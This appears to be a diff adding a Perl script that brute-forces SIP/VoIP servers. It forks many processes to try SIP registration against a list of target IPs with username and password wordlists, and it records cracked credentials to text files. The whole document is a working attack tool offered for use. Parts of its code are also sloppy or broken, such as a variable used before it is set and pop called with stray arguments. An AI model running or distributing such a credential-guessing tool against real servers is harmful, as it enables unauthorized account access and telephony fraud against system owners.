@@ -1,0 +1,195 @@
+#!/usr/bin/perl
+
+use Parallel::ForkManager;
+use Net::SIP;
+my $ips = $ARGV[0];
+my $users = $ARGV[1];
+my $passwords = $ARGV[2];
+my $save2 = "user_and_pass.txt";
+my $save = "user_only.txt";
+my $max_processes = "10";
+#wwwadmin
+open( USERS,  "<$users") || die " Cannot open the  word file : $users ! \n";
+        chomp(@userlist = <USERS>);
+close(USERS);
+open( PASS,  "<$passwords") || die " Cannot open the  word file : $users ! \n";
+        chomp(@passlist = <PASS>);
+close(PASS);
+
+my @foundip;
+
+
+my $i = 0;
+
+
+my $forkmanager = new Parallel::ForkManager->new("500");
+
+$forkmanager->run_on_finish(sub {    # must be declared before first 'start'
+    my ($pid, $exit_code, $ident, $exit_signal, $core_dump, $data) = @_;
+    $out{ $data->[0] } = $data->[1];
+        #print "[onfinish]". $data->[0] ."\n";
+        if (($data->[1] == -1) or ($data->[1] == 1)) {
+                push(@foundip,$data->[0]);
+        }
+
+});
+
+my $foundstring;
+my $cnt =0;
+my $match_found = 0;
+foreach $pass (@passlist) {
+        print "\n==new pass===\n";
+
+        print $pass . " - ";
+        my $pid;
+        $pid=fork();
+        if($pid>0){
+                $npids++;
+                #print " Processes are: $npids\n" ;
+                if($npids>=$max_processes){
+                        for(1..($max_processes)){
+                                my $wait_ret=wait();
+                                if($wait_ret>0){
+                                        $npids--;
+                                }
+                        }
+                }
+                next;
+        }elsif(undef $pid){
+                print " Fork error!\n";
+                exit(0);
+        }else{
+                local $SIG{'ALRM'} = sub { exit(0); };
+                alarm 0;
+
+        eval {
+               $lol = "$user$user";
+                           $lol1 = "$user$user$user";
+                           $lol2 = "test$user";
+                           $lol3 = "abc$user";
+
+               push @passlist, $user;
+              push @passlist, $lol;
+                          push @passlist, $lol1;
+                          push @passlist, $lol2;
+                          push @passlist, $lol3;
+                foreach $user (@userlist) {
+        print $user;
+        print "\n============\n\n";
+        $i++;
+        $cnt =0;
+
+        #print "\nFOUND:\n@foundip\n";
+        my $rez = 0;
+        open($foundipFILE, "< $ips");
+        while (<$foundipFILE>) {
+
+                $line = $_;
+                $line =~ s/\x0a//g;
+
+                if (!grep {$_ eq $line} @foundip) {
+
+                        $cnt++;
+                        my $pid = $forkmanager->start and next;
+
+
+                      if((&crack($line,$user,$pass)) == 1){
+                      print "$line $user $pass\n";
+                      if((&check($line,$user,$pass)) == 1){
+                      open(my $fh, '>>', $save);
+                      print $fh "Host: $line User: $user Password: $pass\n";
+                      close $fh;
+                                          }
+                                          else{
+                                          open(my $fh, '>>', $save2);
+                      print $fh "$line : $user : $pass\n";
+                      close $fh;
+                                          }
+                          }
+                       else {
+                                print "[$cnt] [$line] failed with $user : $pass \n";
+                        }
+                        sleep(1);
+                        $forkmanager->finish(0, [ $line, $rez ]);   # Child exits
+
+                }else{
+                        #print "!!!!! $line was here\n";
+                }
+
+
+
+        }
+        close($foundipFILE);
+
+}
+pop @passlist, $user;
+pop @passlist, $lol;
+pop @passlist, $lol1;
+pop @passlist, $lol2;
+pop @passlist, $lol3;
+
+        };
+
+
+                exit(0);
+        }
+}
+
+for(1..$npids){
+        my $wt=wait();
+        if($wt==-1){
+                print " is  $!\n";
+                redo;
+        }
+}
+#
+
+#
+$forkmanager->wait_all_children();
+print "\n!!!!! FINISH !!!!!!\n";
+
+sub crack{
+alarm("8");
+        my @parms = @_;
+
+        my $ip=$parms[0];
+        my $user=$parms[1];
+        my $pass=$parms[2];
+
+                my $ua = Net::SIP::Simple->new(outgoing_proxy => $ip,
+                                       registrar => $ip,
+                                       domain => $ip,
+                                       from => $user,
+                                       auth => [ $user,$pass ]
+                                                                           );
+# Register agent
+
+$ua->register( expires => 1800 ) || return 0;
+#print "Enregistré\n";
+#return $pass;
+return 1;
+
+}
+sub check {
+alarm("8");
+        my @parms = @_;
+
+        my $ip=$parms[0];
+        my $user=$parms[1];
+        my $pass= "shit";
+
+                my $ua = Net::SIP::Simple->new(outgoing_proxy => $ip,
+                                               registrar => $ip,
+                                               domain => $ip,
+                                               from => $user,
+                                               auth => [ $user,$pass ]
+                                               );
+# Register agent
+
+$ua->register( expires => 1800 ) || return 0;
+
+return 1;
+
+
+}
+
